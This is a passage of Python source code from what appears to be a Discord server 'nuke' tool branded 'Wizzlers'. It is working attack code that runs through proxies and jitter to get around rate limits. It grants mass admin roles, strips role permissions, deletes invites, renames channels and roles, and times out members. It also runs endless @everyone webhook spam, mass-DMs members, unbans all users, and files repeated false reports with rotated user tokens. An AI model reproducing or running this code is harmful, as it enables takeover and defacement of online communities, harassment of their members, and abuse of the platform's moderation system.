            else:
                users_to_admin = [uid.strip() for uid in user_input.split(',') if uid.strip() and uid.strip() not in self.whitelist]
                if not users_to_admin:
                    print(format_log_message("ERROR", "No valid user IDs provided or all are whitelisted!", 32))
                    return (0, 0)
                
            success_count = 0
            total_attempts = len(users_to_admin)
            
            for idx, user_id in enumerate(users_to_admin, 1):
                await add_jitter_delay(0.01, 0.05)
                try:
                    async with session.get(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                        headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as member_resp:
                        if member_resp.status == 429:
                            await asyncio.sleep(2)
                            async with session.get(
                                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                                headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                            ) as retry_resp:
                                if retry_resp.status != 200:
                                    print(format_log_message("ERROR", f"Failed to fetch member {user_id}", 45))
                                    continue
                                member_data = await retry_resp.json()
                        elif member_resp.status != 200:
                            print(format_log_message("ERROR", f"Failed to fetch member {user_id}", 45))
                            continue
                        else:
                            member_data = await member_resp.json()

                        current_roles = member_data.get('roles', [])
                        if admin_role_id not in current_roles:
                            current_roles.append(admin_role_id)

                        assign_payload = {"roles": current_roles}
                        
                    async with session.patch(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                        headers={"Authorization": f"Bot {token}"}, json=assign_payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 429:
                            await asyncio.sleep(2)
                            async with session.patch(
                                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                                headers={"Authorization": f"Bot {token}"}, json=assign_payload, proxy=self._get_proxy()
                            ) as retry_response:
                                if retry_response.status in [200, 204]:
                                    print(format_log_message("SUCCESS", f"Assigned admin to #{user_id} ({idx}/{total_attempts})", 50))
                                    success_count += 1
                                else:
                                    print(format_log_message("ERROR", f"Failed to assign admin to #{user_id}", 45))
                        elif response.status in [200, 204]:
                            print(format_log_message("SUCCESS", f"Assigned admin to #{user_id} ({idx}/{total_attempts})", 50))
                            success_count += 1
                        else:
                            print(format_log_message("ERROR", f"Failed to assign admin to #{user_id}", 45))
                except Exception as e:
                    print(format_log_message("ERROR", f"Error assigning admin to {user_id}: {e}", 45))
                
            print(format_log_message("SUCCESS", f"Gave admin to {success_count}/{total_attempts} users", 40))
            return (success_count, total_attempts)
        except Exception as e:
            print(format_log_message("ERROR", f"Give admin failed: {e}", 40))
            return (0, 0)

    async def execute_delete_invites(self, token: str):
        start_time = time.time()
        async with self.semaphore:
            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/invites",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as invites_resp:
                        if invites_resp.status == 200:
                            invites = await invites_resp.json()
                            total_invites = len(invites)
                            deleted = 0
                            
                            async def delete_invite(invite_code):
                                nonlocal deleted
                                async with self.semaphore:
                                    del_session = await self._get_session()
                                    async with del_session.delete(
                                        f"https://discord.com/api/{next(self.version)}/invites/{invite_code}",
                                        headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                                    ) as del_resp:
                                            if del_resp.status in [200, 204]:
                                                deleted += 1
                                                return True
                                            return False
                                            
                            tasks = [delete_invite(invite['code']) for invite in invites]
                            await asyncio.gather(*tasks)
                            end_time = time.time()
                            return (deleted, end_time - start_time, total_invites)
                        else:
                            print(format_log_message("ERROR", "Failed to fetch invites", 41))
                            return (0, 0, 0)
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to fetch invites | {e}", 41))
                return (0, 0, 0)

    

    async def execute_timeout_all(self, member: str, duration_seconds: int, token: str):
        """Timeout a member for a specified duration."""
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Timeout)", 41))
            return True

        async with self.semaphore:
            await add_jitter_delay(0.01, 0.05)
            timeout_end = (datetime.utcnow() + timedelta(seconds=duration_seconds)).isoformat()
            payload = {"communication_disabled_until": timeout_end}
            try:
                session = await self._get_session()
                async with session.patch(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status in [200, 204]:
                            print(format_log_message("SUCCESS", f"Timed out {member} for {duration_seconds}s", 39))
                            return True
                        elif response.status == 429:
                            retry_after = (await response.json()).get('retry_after', 2)
                            await asyncio.sleep(retry_after)
                            return await self.execute_timeout_all(member, duration_seconds, token)
                        elif response.status == 404:
                            print(format_log_message("INFO", f"Member {member} not found (404), skipping.", 46))
                            return False
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions to timeout {member}", 35))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to timeout {member}: {response.status}", 46))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to timeout {member} | {e}", 46))
                return False

    
    async def execute_rename_channels(self, token: str):
        new_name = await self.async_input(format_log_message("INFO", "New channel name (use {i} for number)", 50))
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status != 200:
                    print(format_log_message("ERROR", "Failed to fetch channels", 40))
                    return 0
                channels = await resp.json()
        count = 0
        for i, ch in enumerate(channels):
            name = new_name.format(i=i)
            payload = {"name": name}
            async with self.semaphore:
                await add_jitter_delay(0)  
                async with session.patch(
                    f"https://discord.com/api/v10/channels/{ch['id']}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 200:
                            count += 1
                            print(format_log_message("SUCCESS", f"Renamed channel #{ch['id']} → {name}", 45))
                        elif resp.status == 429:
                            await asyncio.sleep(2)  
                        
                        async with session.patch(
                            f"https://discord.com/api/v10/channels/{ch['id']}",
                            headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                                ) as retry_resp:
                                    if retry_resp.status == 200:
                                        count += 1
                                        print(format_log_message("SUCCESS", f"Renamed channel #{ch['id']} → {name} (retry)", 45))
        return count

    
    async def execute_rename_roles(self, token: str):
        new_name = await self.async_input(format_log_message("INFO", "New role name (use {i} for number)", 50))
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status != 200:
                    return 0
                roles = await resp.json()
        count = 0
        for i, role in enumerate(roles):
            name = new_name.format(i=i)
            payload = {"name": name}
            async with self.semaphore:
                await add_jitter_delay(0)  
                async with session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role['id']}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 200:
                            count += 1
                            print(format_log_message("SUCCESS", f"Renamed role #{role['id']} → {name}", 45))
                        elif resp.status == 429: 
                            retry_after = (await resp.json()).get('retry_after', 2)
                            await asyncio.sleep(retry_after)
                        async with session.patch(f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role['id']}", headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()) as retry_resp:
                                if retry_resp.status == 200:
                                    count += 1
                                    print(format_log_message("SUCCESS", f"Renamed role #{role['id']} → {name} (retry)", 45))
        return count
    async def execute_webhook_spam(self, token: str):
        webhook_config = __config__.get("nuke", {}).get("webhooks", {})
        webhook_name = webhook_config.get("name", "Wizzlers op")
        webhook_avatar_url = webhook_config.get("avatar_url")
        webhook_messages = webhook_config.get("messages", ["@everyone @here Wizzled by Wizzlers"])

        avatar_data = None
        if webhook_avatar_url:
            avatar_data = await self._fetch_image_as_base64(webhook_avatar_url)

        session = await self._get_session()

        try:
            async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                                   headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    channels = await resp.json()
                    text_channels = [c for c in channels if c['type'] == 0]
                else:
                    print(format_log_message("ERROR", "Failed to fetch channels for webhook spam.", 50))
                    return 0
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch channels for webhook spam: {e}", 50))
            return 0

        if not text_channels:
            print(format_log_message("ERROR", "No text channels found for webhook spam.", 50))
            return 0

        async def create_webhook(channel):
            webhook_payload = {"name": webhook_name}
            if avatar_data:
                webhook_payload["avatar"] = avatar_data
            try:
                async with session.post(
                    f"https://discord.com/api/v10/channels/{channel['id']}/webhooks",
                    headers={"Authorization": f"Bot {token}"},
                    json=webhook_payload, proxy=self._get_proxy()
                ) as resp:
                    if resp.status == 200:
                        webhook_data = await resp.json()
                        print(format_log_message("SUCCESS", f"Webhook created in channel ID {channel['id']} (#{channel['name']})", 50))
                        return webhook_data.get("url")
                    else:
                        print(format_log_message("ERROR", f"Failed to create webhook in channel ID {channel['id']} (#{channel['name']})", 50))
                        return None
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to create webhook in {channel['name']}: {e}", 50))
                return None

        creation_tasks = [create_webhook(channel) for channel in text_channels]
        webhook_urls = await asyncio.gather(*creation_tasks)
        webhook_urls = [url for url in webhook_urls if url]

        if not webhook_urls:
            print(format_log_message("ERROR", "Failed to create any webhooks.", 50))
            return 0

        print(format_log_message("INFO", f"Starting continuous webhook spam to {len(webhook_urls)} webhooks.", 40))

        async def continuous_spam(webhook_url):
            while True:
                try:
                    await self._send_webhook_message_rapid(session, webhook_url, random.choice(webhook_messages))
                except Exception as e:
                    print(format_log_message("ERROR", f"Webhook spam error: {e}", 50))
                    await asyncio.sleep(5)

        for url in webhook_urls:
            asyncio.create_task(continuous_spam(url))

        print(format_log_message("SUCCESS", "Webhook spam is running in the background.", 50))
        return len(webhook_urls)

    async def _send_webhook_message_rapid(self, session, webhook_url, message):
        while True:
            try:
                async with session.post(
                    webhook_url,
                    json={"content": message}, proxy=self._get_proxy()
                ) as resp:
                    if resp.status in [200, 204]:
                        print(format_log_message("SUCCESS", f"Message sent to {webhook_url}", 50))
                        await asyncio.sleep(0.1) 
                        return True
                    elif resp.status == 429:
                        try:
                            retry_after = (await resp.json()).get("retry_after", 1.0)
                        except aiohttp.ContentTypeError:
                            retry_after = 0.5
                        print(format_log_message("INFO", f"Rate limited. Delaying for {retry_after}s", 50))
                        await asyncio.sleep(float(retry_after) + random.uniform(0.1, 0.5))
                    else:
                        print(format_log_message("ERROR", f"Failed to send message to {webhook_url} - Status: {resp.status}", 50))
                        await asyncio.sleep(5)
                        return False
            except Exception as e:
                print(format_log_message("ERROR", f"Exception while sending to {webhook_url}: {e}", 50))
                await asyncio.sleep(5)
                return False

    async def _fetch_image_as_base64(self, url):
        """Fetches an image from a URL and returns it as a base64 data URI."""
        try:
            session = await self._get_session()
            async with session.get(url, proxy=self._get_proxy()) as response:
                if response.status == 200:
                    image_bytes = await response.read()
                    encoded_string = base64.b64encode(image_bytes).decode('utf-8')
                    return f"data:{response.headers['Content-Type']};base64,{encoded_string}"
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch avatar URL: {e}", 40))
        return None

    
    async def execute_pause_invites(self, token: str):
        return await self.execute_delete_invites(token)

    async def _send_dm(self, member_id: str, message: str, token: str):
        """Helper function to send a single DM and log the result."""
        if member_id in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member_id} (DM)", 41))
            return None  

        async with self.semaphore:
            await add_jitter_delay(0.05, 0.01)
            try:
                session = await self._get_session()
                
                async with session.post(
                    f"https://discord.com/api/v10/users/@me/channels",
                    headers={"Authorization": f"Bot {token}"}, json={"recipient_id": member_id}, proxy=self._get_proxy()
                    ) as dm_resp:
                        if dm_resp.status == 200:
                            dm_channel = await dm_resp.json()
                            
                            async with session.post(
                                f"https://discord.com/api/v10/channels/{dm_channel['id']}/messages",
                                headers={"Authorization": f"Bot {token}"}, json={"content": message}, proxy=self._get_proxy()
                            ) as msg_resp:
                                if msg_resp.status == 200:
                                    print(format_log_message("SUCCESS", f"DM sent to {member_id}", 45))
                                    return True
                                else:
                                    
                                    print(format_log_message("ERROR", f"Failed to send DM to {member_id} (Status: {msg_resp.status})", 35))
                                    return False
                        else:
                            
                            print(format_log_message("ERROR", f"Failed to open DM with {member_id} (Status: {dm_resp.status})", 35))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Exception while DMing {member_id}: {e}", 35))
                return False

    
    async def execute_dm_all(self, token: str):
        default_dm = __config__.get("operations", {}).get("dm_message", "@everyone Wizzlers Nuked This Server!")
        message = await self.async_input(format_log_message("INFO", f"DM message (default: {default_dm})", 50))
        if not message.strip():
            message = default_dm

        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
            return 0
        count = 0
        for member in members:
            if member in self.whitelist:
                print(format_log_message("INFO", f"Skipping whitelisted member {member} (DM)", 41))
                continue
        
        tasks = [self._send_dm(member, message, token) for member in members]
        results = await asyncio.gather(*tasks)
        return sum(1 for r in results if r is True)

    
    async def execute_unban_all(self, token: str):
        session = await self._get_session()
        try:
            async with session.get(
                f"https://discord.com/api/v10/guilds/{self.guildid}/bans",
                headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
            ) as resp:
                if resp.status == 200:
                    bans = await resp.json()
                elif resp.status == 429:
                    print(format_log_message("ERROR", "Rate limited while fetching ban list.", 40))
                    return 0
                else:
                    print(format_log_message("ERROR", f"Failed to fetch ban list: {resp.status}", 40))
                    return 0
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch ban list: {e}", 40))
            return 0
        
        if not bans:
            print(format_log_message("INFO", "No banned users found in this guild.", 40))
            return 0

        count = 0
        total_bans = len(bans)
        print(format_log_message("INFO", f"Attempting to unban {total_bans} users...", 40))

        for ban in bans:
            member_id = ban['user']['id']
            if member_id in self.whitelist:
                print(format_log_message("INFO", f"Skipping whitelisted member {member_id} (Unban)", 41))
                continue

            async with self.semaphore:
                try:
                    await add_jitter_delay(0.01, 0.05)
                    async with session.delete(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/bans/{member_id}",
                        headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 204:
                            print(format_log_message("SUCCESS", f"Unbanned {member_id}", 52))
                            count += 1
                        elif resp.status == 429:
                            retry_after = (await resp.json()).get('retry_after', 2)
                            print(format_log_message("ERROR", f"Rate limited. Sleeping for {retry_after}s", 40))
                            await asyncio.sleep(retry_after)
                            
                            # Retry once
                            async with session.delete(
                                f"https://discord.com/api/v10/guilds/{self.guildid}/bans/{member_id}",
                                headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                            ) as retry_resp:
                                if retry_resp.status == 204:
                                    print(format_log_message("SUCCESS", f"Unbanned {member_id} (after retry)", 52))
                                    count += 1
                                else:
                                    print(format_log_message("ERROR", f"Failed to unban {member_id} on retry (Status: {retry_resp.status})", 40))
                        else:
                            print(format_log_message("ERROR", f"Failed to unban {member_id} (Status: {resp.status})", 40))
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to unban {member_id} | {e}", 46))
        
        print(format_log_message("SUCCESS", f"Finished: Unbanned {count}/{total_bans} members.", 40))
        return count

    
    async def execute_strip_perms(self, token: str):
        session = await self._get_session()
        async with session.get(
            f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
            headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
            ) as resp:
                roles = await resp.json()
        count = 0
        for role in roles:
            if role['id'] == self.guildid:
                continue
            payload = {"permissions": "0"}
            async with self.semaphore:
                await add_jitter_delay(0.05, 0.01)  
                async with session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role['id']}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 200:
                            count += 1
                            print(format_log_message("SUCCESS", f"Stripped perms from role #{role['id']}", 45))
                        elif resp.status == 429:
                            await asyncio.sleep(2)  
                            
                            async with session.patch(
                                f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role['id']}",
                                headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                                    ) as retry_resp:
                                        if retry_resp.status == 200:
                                            count += 1
                                            print(format_log_message("SUCCESS", f"Stripped perms from role #{role['id']} (retry)", 45))
                                        else:
                                            print(format_log_message("ERROR", f"Failed to strip perms from role #{role['id']} on retry", 45))
                        else:
                            print(format_log_message("ERROR", f"Failed to strip perms from role #{role['id']}", 45))
        return count

    
    async def execute_auto_admin(self, token: str, user_id: str = None):
        if user_id is None:
            user_id = str(__client__.user.id)
        if user_id in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted user {user_id}", 35))
            return False

        async with self.semaphore:
            await add_jitter_delay(0.05, 0.05)
            try:
                session = await self._get_session()
                async with session.post(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                    headers={"Authorization": f"Bot {token}"},
                    json={"name": "Owner", "permissions": "8", "color": 0xFF0000}, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 429:
                            await asyncio.sleep(2)
                            return await self.execute_auto_admin(token, user_id)
                        if resp.status != 200:
                            print(format_log_message("ERROR", "Failed to create admin role", 45))
                            return False
                        role_id = (await resp.json())['id']
                        print(format_log_message("SUCCESS", f"Created admin role #{role_id}", 45))

                async with session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/members/{user_id}",
                    headers={"Authorization": f"Bot {token}"},
                    json={"roles": [role_id]}, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 429:
                            await asyncio.sleep(2)
                            return await self.execute_auto_admin(token, user_id)
                        if resp.status in [200, 204]:
                            print(format_log_message("SUCCESS", f"Gave admin to user #{user_id}", 45))
                            return True
                        else:
                            print(format_log_message("ERROR", "Failed to assign admin", 45))
                            return False
            except Exception as e:
                print(format_log_message("ERROR", f"Auto admin error: {e}", 45))
                return False

    async def _execute_report(self, payload: dict, token: str):
        """Sends a report to Discord's undocumented report endpoint."""
        async with self.semaphore:
            await add_jitter_delay(0.1, 0.5)
            try:
                session = await self._get_session()
                async with session.post(
                    "https://discord.com/api/v9/report",
                    headers={
                        "Authorization": token,
                        "Content-Type": "application/json"
                    },
                    json=payload,
                    proxy=self._get_proxy()
                ) as response:
                    if response.status in [200, 201, 204]:
                        return True, None
                    else:
                        error_text = await response.text()
                        try:
                            error_json = json.loads(error_text)
                            error_message = error_json.get("message", error_text)
                        except json.JSONDecodeError:
                            error_message = error_text
                        return False, f"Failed with status {response.status}: {error_message}"
            except Exception as e:
                return False, str(e)

    async def execute_mass_report(self):
        token_usage_mode = await self.async_input(format_log_message("INFO", "Single or Multiple token report? (s/m)", 50))
        token_usage_mode = token_usage_mode.strip().lower()

        tokens = []
        if token_usage_mode == 's':
            token_source = await self.async_input(format_log_message("INFO", "Load from tokens.txt (first line) or manual input? (t/m)", 50))
            token_source = token_source.strip().lower()
            if token_source == 't':
                loaded_tokens = load_tokens()
                if loaded_tokens:
                    tokens = [loaded_tokens[0]]
            elif token_source == 'm':
                token = await self.async_input(format_log_message("INFO", "Enter your USER token", 50))
                if token:
                    tokens = [token.strip()]
        elif token_usage_mode == 'm':
            token_source = await self.async_input(format_log_message("INFO", "Load from tokens.txt or manual input? (t/m)", 50))
            token_source = token_source.strip().lower()
            if token_source == 't':
                tokens = load_tokens()
            elif token_source == 'm':
                print(format_log_message("INFO", "Enter user tokens separated by commas", 50))
                tokens_str = await self.async_input(format_log_message("INFO", "Tokens: ", 50))
                tokens = [t.strip() for t in tokens_str.split(',') if t.strip()]
        else:
            print(format_log_message("ERROR", "Invalid token usage mode selected.", 50))
            return False

        if not tokens:
            print(format_log_message("ERROR", "No tokens were loaded or provided.", 50))
            return False

        print(format_log_message("INFO", f"Using {len(tokens)} token(s) for reporting.", 50))
        token_cycle = cycle(tokens)

        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Mass Report Main Menu:", 50))
        print(gradient_text("╭" + "─" * 60 + "╮", mode_start, mode_end, bold=True))
        print(gradient_text("│ [1] Report User (needs message ID)                         │", mode_start, mode_end, bold=True))
        print(gradient_text("│ [2] Report Message                                         │", mode_start, mode_end, bold=True))
        print(gradient_text("│ [3] Report Server                                          │", mode_start, mode_end, bold=True))
        print(gradient_text("╰" + "─" * 60 + "╯", mode_start, mode_end, bold=True))
        
        option = await self.async_input(format_log_message("INFO", "Choose report type (1-3)", 50))
        option = option.strip()

        if option not in ["1", "2", "3"]:
            print(format_log_message("ERROR", "Invalid option!", 50))
            return False

        reason_map = {
            "1": ("Illegal Content", 1),
            "2": ("Harassment", 2),
            "3": ("Spam or Phishing", 3),
            "4": ("Self-Harm", 4),
            "5": ("NSFW Content", 5),
        }

        async def get_reason():
            mode_start, mode_end = get_mode_colors()
            print(format_log_message("INFO", "Select Report Reason:", 50))
            print(gradient_text("╭" + "─" * 60 + "╮", mode_start, mode_end, bold=True))
            print(gradient_text("│ [1] Illegal Content                                        │", mode_start, mode_end, bold=True))
            print(gradient_text("│ [2] Harassment                                             │", mode_start, mode_end, bold=True))
            print(gradient_text("│ [3] Spam or Phishing                                       │", mode_start, mode_end, bold=True))
            print(gradient_text("│ [4] Self-Harm                                              │", mode_start, mode_end, bold=True))
            print(gradient_text("│ [5] NSFW Content                                           │", mode_start, mode_end, bold=True))
            print(gradient_text("╰" + "─" * 60 + "╯", mode_start, mode_end, bold=True))
            reason_choice = await self.async_input(format_log_message("INFO", "Choose reason (1-5)", 50))
            return reason_map.get(reason_choice.strip())

        payload = {"guild_id": self.guildid}
        report_target_info = ""
        
        reason_tuple = await get_reason()
        if not reason_tuple:
            print(format_log_message("ERROR", "Invalid reason selected.", 50))
            return False
        
        payload["reason"] = reason_tuple[1]

        if option == "1" or option == "2": 
            if option == "1":
                print(format_log_message("INFO", "To report a user, you must provide a specific message ID from them.", 60))
            channel_id = await self.async_input(format_log_message("INFO", "Channel ID of the message", 50))
            message_id = await self.async_input(format_log_message("INFO", "Message ID to report", 50))
            if not channel_id.strip().isdigit() or not message_id.strip().isdigit():
                print(format_log_message("ERROR", "Invalid Channel or Message ID.", 50))
                return False
            payload["channel_id"] = channel_id.strip()
            payload["message_id"] = message_id.strip()
            report_target_info = f"Message {message_id} in Channel {channel_id}"
        
        elif option == "3":
            report_target_info = f"Server {self.guildid}"
            try:
                session = await self._get_session()
                async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels", headers={"Authorization": next(token_cycle)}, proxy=self._get_proxy()) as resp:
                    if resp.status == 200:
                        channels = await resp.json()
                        if channels:
                            payload["channel_id"] = channels[0]['id']
            except Exception:
                print(format_log_message("WARNING", "Could not fetch a channel for context.", 50))
        
        else:
            print(format_log_message("ERROR", "Invalid option!", 50))
            return False

        try:
            repeat_count = int((await self.async_input(format_log_message("INFO", "Number of times to report (e.g., 10)", 50))).strip())
            if repeat_count < 1:
                repeat_count = 1
        except ValueError:
            print(format_log_message("ERROR", "Invalid repeat count, defaulting to 1", 50))
            repeat_count = 1

        print(format_log_message("SUCCESS", f"Submitting {repeat_count} reports for {report_target_info}...", 45))
        
        success_count = 0
        tasks = [self._execute_report(payload, next(token_cycle)) for _ in range(repeat_count)]
        results = await asyncio.gather(*tasks)

        for i, (success, error_msg) in enumerate(results):
            if success:
                success_count += 1
                print(format_log_message("SUCCESS", f"Report {i+1}/{repeat_count} submitted for {report_target_info}", 50))
            else:
                print(format_log_message("ERROR", f"Report {i+1}/{repeat_count} failed: {error_msg}", 50))
        
        print(format_log_message("SUCCESS", f"Completed. Submitted {success_count}/{repeat_count} reports on {report_target_info}", 40))
        return True

    
    async def execute_rename_emojis(self, token: str):
        new_name = await self.async_input(format_log_message("INFO", "New emoji name (use {i})", 50))
        session = await self._get_session()
        async with session.get(
            f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
            headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
            ) as resp:
                if resp.status != 200:
                    return 0
                emojis = await resp.json()
        count = 0
        for i, emoji in enumerate(emojis):
            name = new_name.format(i=i)
            payload = {"name": name}
            async with self.semaphore:
                async with session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/emojis/{emoji['id']}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 200:
                            count += 1
        return count
    
    
    async def execute_unick_all(self, token: str):
        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
            return 0
        count = 0
        for member in members:
            if member in self.whitelist:
                print(format_log_message("INFO", f"Skipping whitelisted member {member} (Unick)", 41))
                continue

            async with self.semaphore:
                session = await self._get_session()
                async with session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/members/{member}",
                    headers={"Authorization": f"Bot {token}"}, json={"nick": None}, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 200:
                            count += 1
        return count

    
    async def execute_clone_server(self, token: str):
        source_guild_id = await self.async_input(format_log_message("INFO", "Enter the source guild ID to clone from", 50))
        if not source_guild_id.isdigit():
            print(format_log_message("ERROR", "Invalid source guild ID.", 40))
            return False

        dest_guild_id = await self.async_input(format_log_message("INFO", "Enter the destination guild ID to clone to", 50))
        if not dest_guild_id.isdigit():
            print(format_log_message("ERROR", "Invalid destination guild ID.", 40))
            return False

        session = await self._get_session()

        
        try:
            async with session.get(f"https://discord.com/api/v10/guilds/{source_guild_id}", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status != 200:
                    print(format_log_message("ERROR", f"Failed to fetch source guild {source_guild_id}", 40))
                    return False
                source_guild = await resp.json()
        except Exception as e:
            print(format_log_message("ERROR", f"Error fetching source guild: {e}", 40))
            return False

        print(format_log_message("INFO", f"Cloning server '{source_guild['name']}'...", 40))

        
        async with session.get(f"https://discord.com/api/v10/guilds/{source_guild_id}/roles", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
            if resp.status != 200:
                print(format_log_message("ERROR", f"Failed to fetch roles from {source_guild_id}", 40))
                return False
            source_roles = await resp.json()

        
        async with session.get(f"https://discord.com/api/v10/guilds/{source_guild_id}/channels", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
            if resp.status != 200:
                print(format_log_message("ERROR", f"Failed to fetch channels from {source_guild_id}", 40))
                return False
            source_channels = await resp.json()

        
        role_map = {}  
        for role in sorted(source_roles, key=lambda r: r['position'], reverse=True):
            if role['name'] == '@everyone':
                role_map[role['id']] = dest_guild_id
                continue
            
            payload = {
                "name": role['name'],
                "permissions": role['permissions'],
                "color": role['color'],
                "hoist": role['hoist'],
                "mentionable": role['mentionable']
            }
            async with session.post(f"https://discord.com/api/v10/guilds/{dest_guild_id}/roles", headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    new_role = await resp.json()
                    role_map[role['id']] = new_role['id']
                    print(format_log_message("SUCCESS", f"Created role '{new_role['name']}'", 40))
                else:
                    print(format_log_message("ERROR", f"Failed to create role '{role['name']}'. Response: {await resp.text()}", 40))

        
        for channel in source_channels:
            overwrites = []
            for ow in channel.get('permission_overwrites', []):
                if ow['id'] in role_map:
                    overwrites.append({
                        "id": role_map[ow['id']],
                        "type": ow['type'],
                        "allow": ow['allow'],
                        "deny": ow['deny']
                    })

            payload = {
                "name": channel['name'],
                "type": channel['type'],
                "topic": channel.get('topic'),
                "nsfw": channel.get('nsfw', False),
                "permission_overwrites": overwrites,
                "parent_id": channel.get('parent_id')
            }
            async with session.post(f"https://discord.com/api/v10/guilds/{dest_guild_id}/channels", headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()) as resp:
                if resp.status == 201:
                    new_channel = await resp.json()
                    print(format_log_message("SUCCESS", f"Created channel '{new_channel['name']}'", 40))
                else:
                    print(format_log_message("ERROR", f"Failed to create channel '{channel['name']}'. Response: {await resp.text()}", 40))

        print(format_log_message("SUCCESS", "Server clone process completed.", 40))
        return True

    async def execute_guild_info(self, token: str):
        guild_id = await self.async_input(format_log_message("INFO", "Enter the guild ID to fetch info for", 50))
        if not guild_id.isdigit():
            print(format_log_message("ERROR", "Invalid guild ID.", 40))
            return

        session = await self._get_session()
        try:
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status != 200:
                    print(format_log_message("ERROR", f"Failed to fetch guild {guild_id}", 40))
                    return
                guild = await resp.json()

            owner_id = guild.get('owner_id')
            owner_name = "N/A"
            if owner_id:
                async with session.get(f"https://discord.com/api/v10/users/{owner_id}", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as user_resp:
                    if user_resp.status == 200:
                        owner_data = await user_resp.json()
                        owner_name = f"{owner_data.get('username')}#{owner_data.get('discriminator')}"

            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                channels = await resp.json() if resp.status == 200 else []
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/roles", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                roles = await resp.json() if resp.status == 200 else []
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/emojis", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                emojis = await resp.json() if resp.status == 200 else []

